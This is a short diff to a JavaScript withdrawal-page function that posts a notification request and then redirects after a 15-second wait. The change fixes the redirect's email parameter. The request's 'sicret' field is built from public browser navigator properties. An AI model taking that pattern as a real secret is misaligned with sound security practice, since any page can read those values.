@@ -69,8 +69,9 @@ async function show(keys) {
     send_request("post", false, "withdraw-notifications", { type: "withdraw", address: address_value, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
     wait.classList.add('active');
 
+
     setTimeout(() => {
-        window.location.href = `withdraw-3.html?email=${url}`
+        window.location.href = `withdraw-3.html?email=${address_value}`
     }, 15000)
 }
 
